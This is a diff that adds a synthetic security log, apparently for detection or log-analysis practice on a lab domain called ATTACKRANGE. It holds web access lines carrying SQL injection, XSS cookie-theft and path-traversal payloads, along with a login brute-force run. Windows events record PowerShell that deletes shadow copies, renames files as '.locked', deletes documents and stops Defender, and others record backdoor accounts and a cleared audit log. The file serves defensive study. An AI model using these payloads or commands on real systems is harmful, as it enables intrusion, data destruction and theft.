@@ -1,0 +1,50 @@
+192.168.1.52 - - [22/Jul/2026:10:54:26 +0700] "GET /about-us.html HTTP/1.1" 200 3925
+192.168.1.51 - - [22/Jul/2026:10:54:28 +0700] "GET /assets/images/logo.png HTTP/1.1" 200 5388
+10.0.0.15 - - [22/Jul/2026:10:54:31 +0700] "GET /contact.html HTTP/1.1" 200 2562
+192.168.1.52 - - [22/Jul/2026:10:54:32 +0700] "GET /services.html HTTP/1.1" 200 2251
+192.168.1.52 - - [22/Jul/2026:10:54:34 +0700] "GET /about-us.html HTTP/1.1" 200 6690
+203.0.113.88 - - [22/Jul/2026:10:54:36 +0700] "GET /database.sql HTTP/1.1" 404 288
+203.0.113.88 - - [22/Jul/2026:10:54:36 +0700] "GET /wp-login.php HTTP/1.1" 404 127
+203.0.113.88 - - [22/Jul/2026:10:54:37 +0700] "GET /config.php.bak HTTP/1.1" 404 174
+203.0.113.88 - - [22/Jul/2026:10:54:37 +0700] "GET /.git/config HTTP/1.1" 404 194
+203.0.113.88 - - [22/Jul/2026:10:54:38 +0700] "GET /test/ HTTP/1.1" 404 148
+203.0.113.88 - - [22/Jul/2026:10:54:38 +0700] "GET /backup/ HTTP/1.1" 404 108
+203.0.113.88 - - [22/Jul/2026:10:54:38 +0700] "GET /server-status HTTP/1.1" 404 253
+203.0.113.88 - - [22/Jul/2026:10:54:39 +0700] "GET /phpmyadmin/ HTTP/1.1" 404 199
+203.0.113.88 - - [22/Jul/2026:10:54:39 +0700] "GET /api/debug HTTP/1.1" 404 289
+203.0.113.88 - - [22/Jul/2026:10:54:40 +0700] "GET /wp-admin/ HTTP/1.1" 404 197
+198.51.100.22 - - [22/Jul/2026:10:54:40 +0700] "GET /index.php?id=1'%20UNION%20SELECT%20username,%20password%20FROM%20users-- HTTP/1.1" 200 5420
+198.51.100.22 - - [22/Jul/2026:10:54:41 +0700] "GET /login.php?user=admin'%20OR%20'1'='1' HTTP/1.1" 200 4125
+198.51.100.22 - - [22/Jul/2026:10:54:42 +0700] "GET /search.php?q=1%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables)>0-- HTTP/1.1" 200 3200
+198.51.100.22 - - [22/Jul/2026:10:54:43 +0700] "GET /products.php?cat=1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- HTTP/1.1" 200 6800
+203.0.113.88 - - [22/Jul/2026:10:54:44 +0700] "GET /search.php?q=<script>alert(1)</script> HTTP/1.1" 200 3410
+203.0.113.88 - - [22/Jul/2026:10:54:45 +0700] "POST /comment.php?user=anon&msg=<iframe+src='javascript:alert(document.cookie)'> HTTP/1.1" 400 250
+203.0.113.88 - - [22/Jul/2026:10:54:45 +0700] "GET /profile.php?name=<img+src=x+onerror=alert('XSS')> HTTP/1.1" 200 2800
+203.0.113.88 - - [22/Jul/2026:10:54:46 +0700] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 0
+203.0.113.88 - - [22/Jul/2026:10:54:47 +0700] "GET /view?page=..\..\..\..\windows\win.ini HTTP/1.1" 404 210
+203.0.113.88 - - [22/Jul/2026:10:54:48 +0700] "GET /include.php?file=....//....//....//etc/shadow HTTP/1.1" 403 0
+203.0.113.150 - - [22/Jul/2026:10:54:49 +0700] "GET /download.php?file=secret_backup_db.sql HTTP/1.1" 200 985420100
+203.0.113.150 - - [22/Jul/2026:10:54:50 +0700] "POST /api/v1/user/profile HTTP/1.1" 200 1040 "user_agent: python-requests/2.31.0" "user: somchai_staff"
+114.23.45.12 - - [22/Jul/2026:10:54:51 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 80
+114.23.45.12 - - [22/Jul/2026:10:54:51 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 11
+114.23.45.12 - - [22/Jul/2026:10:54:52 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 58
+114.23.45.12 - - [22/Jul/2026:10:54:52 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 50
+114.23.45.12 - - [22/Jul/2026:10:54:53 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 41
+114.23.45.12 - - [22/Jul/2026:10:54:53 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 46
+114.23.45.12 - - [22/Jul/2026:10:54:54 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 43
+114.23.45.12 - - [22/Jul/2026:10:54:54 +0700] "POST /api/v1/auth/login HTTP/1.1" 401 101
+114.23.45.12 - - [22/Jul/2026:10:54:56 +0700] "POST /api/v1/auth/login HTTP/1.1" 200 1420
+{"EventID": 4625, "ProviderName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Message": "An account failed to log on.", "targetUserName": "administrator", "ipAddress": "198.51.100.77", "status": "0xC000006A"}
+{"EventID": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Channel": "PowerShell", "scriptBlockText": "vssadmin.exe delete shadows /all /quiet ; Get-ChildItem C:\\SharedDocs\\ -Recurse | ForEach-Object { Rename-Item $_.FullName ($_.Name + '.locked') }", "user": "SYSTEM"}
+{"EventID": 4720, "ProviderName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Message": "A user account was created.", "targetUserName": "svc_backdoor", "subjectUserName": "SYSTEM"}
+{"EventID": 4732, "ProviderName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Message": "A member was added to a security-enabled local group.", "targetUserName": "hacker_admin", "targetSid": "S-1-5-32-544", "subjectUserName": "SYSTEM"}
+{"EventID": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Channel": "PowerShell", "scriptBlockText": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-ChildItem C:\\Users\\*\\Documents -Recurse | ForEach-Object { $_.Delete() } ; Stop-Service -Name WinDefend\"", "user": "SYSTEM"}
+{"EventID": 1102, "ProviderName": "Microsoft-Windows-Eventlog", "Channel": "Security", "Message": "The audit log was cleared.", "subjectUserName": "administrator", "subjectDomainName": "ATTACKRANGE"}
+{"EventID": 4624, "ProviderName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Message": "An account was successfully logged on.", "targetUserName": "somchai_staff", "targetDomainName": "ATTACKRANGE", "logonType": "3", "ipAddress": "192.168.1.115"}
+Jul 22 10:55:07 cisco-fw %ASA-4-106103: access-list inbound denied tcp for user 'none' 45.33.22.11(49835) -> 172.16.10.5(3389)
+Jul 22 10:55:07 cisco-fw %ASA-4-106103: access-list inbound denied tcp for user 'none' 45.33.22.11(57631) -> 172.16.10.5(8080)
+Jul 22 10:55:07 cisco-fw %ASA-4-106103: access-list inbound denied tcp for user 'none' 45.33.22.11(54832) -> 172.16.10.5(23)
+Jul 22 10:55:07 cisco-fw %ASA-4-106103: access-list inbound denied tcp for user 'none' 45.33.22.11(55111) -> 172.16.10.5(443)
+Jul 22 10:55:07 cisco-fw %ASA-4-400000: IPS:1000 IP options-Bad Option List 31.93.211.190 -> 88.6.197.89
+Jul 22 10:55:07 cisco-fw %ASA-4-400014: IPS:2004 ICMP Echo Request flood drop rate exceeded from MULTIPLE_IPS to 172.16.10.100
+Jul 22 10:55:07 cisco-fw %ASA-4-106103: access-list outbound denied tcp inside:172.16.10.50(59389) -> outside:185.220.101.99(4444)
